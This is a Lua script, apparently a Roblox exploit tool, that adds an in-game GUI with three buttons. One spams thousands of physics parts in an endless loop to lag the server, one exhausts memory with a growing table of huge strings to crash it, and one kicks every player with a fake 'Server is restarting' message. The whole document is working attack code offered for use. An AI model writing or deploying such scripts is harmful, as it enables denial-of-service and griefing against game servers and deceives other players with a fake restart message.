local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 250, 0, 200)
Frame.Position = UDim2.new(0.5, -125, 0.5, -100)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)

local function createBtn(text, pos, color, func)
    local b = Instance.new("TextButton", Frame)
    b.Size = UDim2.new(0, 200, 0, 40)
    b.Position = pos
    b.Text = text
    b.BackgroundColor3 = color
    b.MouseButton1Click:Connect(func)
end

-- 1. LAG: Спам физическими объектами (нагрузка на CPU/Physics)
createBtn("ULTRA LAG", UDim2.new(0, 25, 0, 20), Color3.fromRGB(200, 100, 0), function()
    while task.wait() do
        for i = 1, 5000 do
            local p = Instance.new("Part")
            p.Size = Vector3.new(10, 10, 10)
            p.Position = Vector3.new(math.random(-100,100), 100, math.random(-100,100))
            p.Parent = game.Workspace
        end
    end
end)

-- 2. SHUTDOWN: Попытка вызвать критическую ошибку памяти
createBtn("SHUTDOWN (Crash)", UDim2.new(0, 25, 0, 70), Color3.fromRGB(200, 0, 0), function()
    -- Бесконечная таблица забивает RAM сервера за секунды
    local crashTable = {}
    while true do
        table.insert(crashTable, string.rep("CRASH", 1000000))
    end
end)

-- 3. RESTART: Технически это кик всех игроков (имитация рестарта)
createBtn("RESTART SERVER", UDim2.new(0, 25, 0, 120), Color3.fromRGB(0, 100, 200), function()
    -- Работает только если уязвимость позволяет слать сигналы всем
    for _, player in pairs(game.Players:GetPlayers()) do
        player:Kick("Server is restarting. Please wait...")
    end
end)
